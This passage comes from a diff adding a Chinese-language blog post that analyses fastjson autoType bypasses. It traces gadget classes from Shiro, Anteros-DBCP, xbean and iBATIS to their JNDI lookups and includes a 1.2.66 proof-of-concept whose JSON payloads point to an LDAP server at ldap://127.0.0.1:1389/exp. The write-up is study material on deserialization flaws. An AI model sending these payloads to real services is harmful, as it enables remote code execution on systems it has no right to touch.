+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">jsonType</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">TypeUtils</span><span class="o">.</span><span class="na">addMapping</span><span class="o">(</span><span class="n">typeName</span><span class="o">,</span> <span class="n">clazz</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">clazz</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">ClassLoader</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">isAssignableFrom</span><span class="o">(</span><span class="n">clazz</span><span class="o">)</span> <span class="o">||</span> <span class="n">javax</span><span class="o">.</span><span class="na">sql</span><span class="o">.</span><span class="na">DataSource</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">isAssignableFrom</span><span class="o">(</span><span class="n">clazz</span><span class="o">)</span> <span class="o">||</span> <span class="n">javax</span><span class="o">.</span><span class="na">sql</span><span class="o">.</span><span class="na">RowSet</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">isAssignableFrom</span><span class="o">(</span><span class="n">clazz</span><span class="o">))</span> <span class="o">{</span><span class="c1">// 判断clazz是否为ClassLoader,DataSource,RowSet等类的子类,如果是则抛出异常
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="k">throw</span> <span class="k">new</span> <span class="n">JSONException</span><span class="o">(</span><span class="s">&#34;autoType is not support. &#34;</span> <span class="o">+</span> <span class="n">typeName</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">            <span class="o">...</span>
+</span></span><span class="line"><span class="cl">            <span class="n">JavaBeanInfo</span> <span class="n">beanInfo</span> <span class="o">=</span> <span class="n">JavaBeanInfo</span><span class="o">.</span><span class="na">build</span><span class="o">(</span><span class="n">clazz</span><span class="o">,</span> <span class="n">clazz</span><span class="o">,</span> <span class="n">propertyNamingStrategy</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="o">(</span><span class="n">beanInfo</span><span class="o">.</span><span class="na">creatorConstructor</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">autoTypeSupport</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">throw</span> <span class="k">new</span> <span class="n">JSONException</span><span class="o">(</span><span class="s">&#34;autoType is not support. &#34;</span> <span class="o">+</span> <span class="n">typeName</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span><span class="c1">//添加到mappings中
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">TypeUtils</span><span class="o">.</span><span class="na">addMapping</span><span class="o">(</span><span class="n">typeName</span><span class="o">,</span> <span class="n">clazz</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">clazz</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="jndiconverter分析">JndiConverter分析</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//org.apache.xbean.propertyeditor.AbstractConverter
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">public</span> <span class="kd">final</span> <span class="kt">void</span> <span class="nf">setAsText</span><span class="o">(</span><span class="n">String</span> <span class="n">text</span><span class="o">)</span> <span class="o">{</span><span class="c1">//text为ldap地址
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">Object</span> <span class="n">value</span> <span class="o">=</span> <span class="n">toObject</span><span class="o">(</span><span class="n">text</span><span class="o">.</span><span class="na">trim</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">super</span><span class="o">.</span><span class="na">setValue</span><span class="o">(</span><span class="n">value</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">final</span> <span class="n">Object</span> <span class="nf">toObject</span><span class="o">(</span><span class="n">String</span> <span class="n">text</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">text</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Object</span> <span class="n">value</span> <span class="o">=</span> <span class="n">toObjectImpl</span><span class="o">(</span><span class="n">text</span><span class="o">.</span><span class="na">trim</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">value</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2023/02/86b861a80107aa502730fd9ccaab4448.png"
+        data-srcset="https://img.mi3aka.eu.org/2023/02/86b861a80107aa502730fd9ccaab4448.png, https://img.mi3aka.eu.org/2023/02/86b861a80107aa502730fd9ccaab4448.png 1.5x, https://img.mi3aka.eu.org/2023/02/86b861a80107aa502730fd9ccaab4448.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2023/02/86b861a80107aa502730fd9ccaab4448.png"
+        title="https://img.mi3aka.eu.org/2023/02/86b861a80107aa502730fd9ccaab4448.png" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//org.apache.xbean.propertyeditor.JndiConverter
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">public</span> <span class="nf">JndiConverter</span><span class="o">()</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">super</span><span class="o">(</span><span class="n">Context</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">protected</span> <span class="n">Object</span> <span class="nf">toObjectImpl</span><span class="o">(</span><span class="n">String</span> <span class="n">text</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">InitialContext</span> <span class="n">context</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InitialContext</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="o">(</span><span class="n">Context</span><span class="o">)</span> <span class="n">context</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="n">text</span><span class="o">);</span><span class="c1">//text为ldap地址,lookup进行JNDI注入
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">NamingException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="n">PropertyEditorException</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="1266">1.2.66</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">learn.bypass</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.alibaba.fastjson.JSON</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.alibaba.fastjson.parser.ParserConfig</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm">与1.2.45的绕过类似,通过多个类进行绕过
+</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">bypass_1_2_66</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ParserConfig</span><span class="o">.</span><span class="na">getGlobalInstance</span><span class="o">().</span><span class="na">setAutoTypeSupport</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// String json_str = &#34;{\&#34;@type\&#34;:\&#34;org.apache.shiro.realm.jndi.JndiRealmFactory\&#34;, \&#34;jndiNames\&#34;:[\&#34;ldap://127.0.0.1:1389/exp\&#34;], \&#34;Realms\&#34;:[\&#34;\&#34;]}&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// String json_str = &#34;{\&#34;@type\&#34;:\&#34;br.com.anteros.dbcp.AnterosDBCPConfig\&#34;,\&#34;metricRegistry\&#34;:\&#34;ldap://127.0.0.1:1389/exp\&#34;}&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// String json_str = &#34;{\&#34;@type\&#34;:\&#34;br.com.anteros.dbcp.AnterosDBCPConfig\&#34;,\&#34;healthCheckRegistry\&#34;:\&#34;ldap://127.0.0.1:1389/exp\&#34;}&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">String</span> <span class="n">json_str</span> <span class="o">=</span> <span class="s">&#34;{\&#34;@type\&#34;:\&#34;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\&#34;,\&#34;properties\&#34;: {\&#34;@type\&#34;:\&#34;java.util.Properties\&#34;,\&#34;UserTransaction\&#34;:\&#34;ldap://127.0.0.1:1389/exp\&#34;}}&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">JSON</span><span class="o">.</span><span class="na">parseObject</span><span class="o">(</span><span class="n">json_str</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2023/02/e659935b747e9d2293cba54091dffce8.png"
+        data-srcset="https://img.mi3aka.eu.org/2023/02/e659935b747e9d2293cba54091dffce8.png, https://img.mi3aka.eu.org/2023/02/e659935b747e9d2293cba54091dffce8.png 1.5x, https://img.mi3aka.eu.org/2023/02/e659935b747e9d2293cba54091dffce8.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2023/02/e659935b747e9d2293cba54091dffce8.png"
+        title="https://img.mi3aka.eu.org/2023/02/e659935b747e9d2293cba54091dffce8.png" /></p>
+<h3 id="jndirealmfactory分析">JndiRealmFactory分析</h3>
+<blockquote>
+<p>shiro-core 1.2.4</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//org.apache.shiro.realm.jndi.JndiRealmFactory
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setJndiNames</span><span class="o">(</span><span class="n">Collection</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span> <span class="n">jndiNames</span><span class="o">)</span> <span class="o">{</span><span class="c1">//jndiNames:[&#34;ldap://127.0.0.1:1389/exp&#34;]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">this</span><span class="o">.</span><span class="na">jndiNames</span> <span class="o">=</span> <span class="n">jndiNames</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="n">Collection</span><span class="o">&lt;</span><span class="n">Realm</span><span class="o">&gt;</span> <span class="nf">getRealms</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">IllegalStateException</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Collection</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span> <span class="n">jndiNames</span> <span class="o">=</span> <span class="n">getJndiNames</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="o">...</span>
+</span></span><span class="line"><span class="cl">        <span class="n">List</span><span class="o">&lt;</span><span class="n">Realm</span><span class="o">&gt;</span> <span class="n">realms</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">Realm</span><span class="o">&gt;(</span><span class="n">jndiNames</span><span class="o">.</span><span class="na">size</span><span class="o">());</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="o">(</span><span class="n">String</span> <span class="n">name</span> <span class="o">:</span> <span class="n">jndiNames</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">try</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">Realm</span> <span class="n">realm</span> <span class="o">=</span> <span class="o">(</span><span class="n">Realm</span><span class="o">)</span> <span class="n">lookup</span><span class="o">(</span><span class="n">name</span><span class="o">,</span> <span class="n">Realm</span><span class="o">.</span><span class="na">class</span><span class="o">);</span><span class="c1">//lookup进行JNDI注入
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">realms</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">realm</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">throw</span> <span class="k">new</span> <span class="n">IllegalStateException</span><span class="o">(</span><span class="s">&#34;Unable to look up realm with jndi name &#39;&#34;</span> <span class="o">+</span> <span class="n">name</span> <span class="o">+</span> <span class="s">&#34;&#39;.&#34;</span><span class="o">,</span> <span class="n">e</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">realms</span><span class="o">.</span><span class="na">isEmpty</span><span class="o">()</span> <span class="o">?</span> <span class="kc">null</span> <span class="o">:</span> <span class="n">realms</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2023/02/9032694ddb532ba667f7624fa7b2e2e7.png"
+        data-srcset="https://img.mi3aka.eu.org/2023/02/9032694ddb532ba667f7624fa7b2e2e7.png, https://img.mi3aka.eu.org/2023/02/9032694ddb532ba667f7624fa7b2e2e7.png 1.5x, https://img.mi3aka.eu.org/2023/02/9032694ddb532ba667f7624fa7b2e2e7.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2023/02/9032694ddb532ba667f7624fa7b2e2e7.png"
+        title="https://img.mi3aka.eu.org/2023/02/9032694ddb532ba667f7624fa7b2e2e7.png" /></p>
+<p>前面对<code>com.alibaba.fastjson.util.JavaBeanInfo</code>进行分析时,提到get方法能否加入fieldList中会进行如下判断</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">if</span> <span class="o">(</span><span class="n">Collection</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">isAssignableFrom</span><span class="o">(</span><span class="n">method</span><span class="o">.</span><span class="na">getReturnType</span><span class="o">())</span> <span class="o">||</span> <span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">isAssignableFrom</span><span class="o">(</span><span class="n">method</span><span class="o">.</span><span class="na">getReturnType</span><span class="o">())</span> <span class="o">||</span> <span class="n">AtomicBoolean</span><span class="o">.</span><span class="na">class</span> <span class="o">==</span> <span class="n">method</span><span class="o">.</span><span class="na">getReturnType</span><span class="o">()</span> <span class="o">||</span> <span class="n">AtomicInteger</span><span class="o">.</span><span class="na">class</span> <span class="o">==</span> <span class="n">method</span><span class="o">.</span><span class="na">getReturnType</span><span class="o">()</span> <span class="o">||</span> <span class="n">AtomicLong</span><span class="o">.</span><span class="na">class</span> <span class="o">==</span> <span class="n">method</span><span class="o">.</span><span class="na">getReturnType</span><span class="o">())</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>显然<code>getRealms</code>满足判断条件</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2023/02/9b7e6599b4669a39e6803dcafe6d1a63.png"
+        data-srcset="https://img.mi3aka.eu.org/2023/02/9b7e6599b4669a39e6803dcafe6d1a63.png, https://img.mi3aka.eu.org/2023/02/9b7e6599b4669a39e6803dcafe6d1a63.png 1.5x, https://img.mi3aka.eu.org/2023/02/9b7e6599b4669a39e6803dcafe6d1a63.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2023/02/9b7e6599b4669a39e6803dcafe6d1a63.png"
+        title="https://img.mi3aka.eu.org/2023/02/9b7e6599b4669a39e6803dcafe6d1a63.png" /></p>
+<h3 id="anterosdbcpconfig分析">AnterosDBCPConfig分析</h3>
+<blockquote>
+<p>Anteros-DBCP 1.0.1, Anteros-Core 1.2.0</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//br.com.anteros.dbcp.AnterosDBCPConfig
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setMetricRegistry</span><span class="o">(</span><span class="n">Object</span> <span class="n">metricRegistry</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">    <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">metricRegistry</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">metricRegistry</span> <span class="o">=</span> <span class="n">getObjectOrPerformJndiLookup</span><span class="o">(</span><span class="n">metricRegistry</span><span class="o">);</span><span class="c1">//jndi查询
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="o">...</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="o">.</span><span class="na">metricRegistry</span> <span class="o">=</span> <span class="n">metricRegistry</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setHealthCheckRegistry</span><span class="o">(</span><span class="n">Object</span> <span class="n">healthCheckRegistry</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">    <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">healthCheckRegistry</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">healthCheckRegistry</span> <span class="o">=</span> <span class="n">getObjectOrPerformJndiLookup</span><span class="o">(</span><span class="n">healthCheckRegistry</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="o">...</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="o">.</span><span class="na">healthCheckRegistry</span> <span class="o">=</span> <span class="n">healthCheckRegistry</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2023/02/4cd47e5e7ca286e79e4ff3ef4d46fc8b.png"
+        data-srcset="https://img.mi3aka.eu.org/2023/02/4cd47e5e7ca286e79e4ff3ef4d46fc8b.png, https://img.mi3aka.eu.org/2023/02/4cd47e5e7ca286e79e4ff3ef4d46fc8b.png 1.5x, https://img.mi3aka.eu.org/2023/02/4cd47e5e7ca286e79e4ff3ef4d46fc8b.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2023/02/4cd47e5e7ca286e79e4ff3ef4d46fc8b.png"
+        title="https://img.mi3aka.eu.org/2023/02/4cd47e5e7ca286e79e4ff3ef4d46fc8b.png" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl">    <span class="kd">private</span> <span class="n">Object</span> <span class="nf">getObjectOrPerformJndiLookup</span><span class="o">(</span><span class="n">Object</span> <span class="n">object</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">    <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">object</span> <span class="k">instanceof</span> <span class="n">String</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">try</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">InitialContext</span> <span class="n">initCtx</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InitialContext</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">initCtx</span><span class="o">.</span><span class="na">lookup</span><span class="o">((</span><span class="n">String</span><span class="o">)</span> <span class="n">object</span><span class="o">);</span><span class="c1">//lookup进行JNDI注入
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">            <span class="k">catch</span> <span class="o">(</span><span class="n">NamingException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">throw</span> <span class="k">new</span> <span class="n">IllegalArgumentException</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">object</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2023/02/2e90ccc0f7f2f59407710394b8c48abe.png"
+        data-srcset="https://img.mi3aka.eu.org/2023/02/2e90ccc0f7f2f59407710394b8c48abe.png, https://img.mi3aka.eu.org/2023/02/2e90ccc0f7f2f59407710394b8c48abe.png 1.5x, https://img.mi3aka.eu.org/2023/02/2e90ccc0f7f2f59407710394b8c48abe.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2023/02/2e90ccc0f7f2f59407710394b8c48abe.png"
+        title="https://img.mi3aka.eu.org/2023/02/2e90ccc0f7f2f59407710394b8c48abe.png" /></p>
+<h3 id="jtatransactionconfig分析">JtaTransactionConfig分析</h3>
+<blockquote>
+<p>ibatis-sqlmap 2.3.4.726 , jta 1.1</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setProperties</span><span class="o">(</span><span class="n">Properties</span> <span class="n">props</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">SQLException</span><span class="o">,</span> <span class="n">TransactionException</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">utxName</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">utxName</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span> <span class="n">props</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">&#34;UserTransaction&#34;</span><span class="o">);</span><span class="c1">//获取UserTransaction的值,即ldap地址
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">InitialContext</span> <span class="n">initCtx</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InitialContext</span><span class="o">();</span>
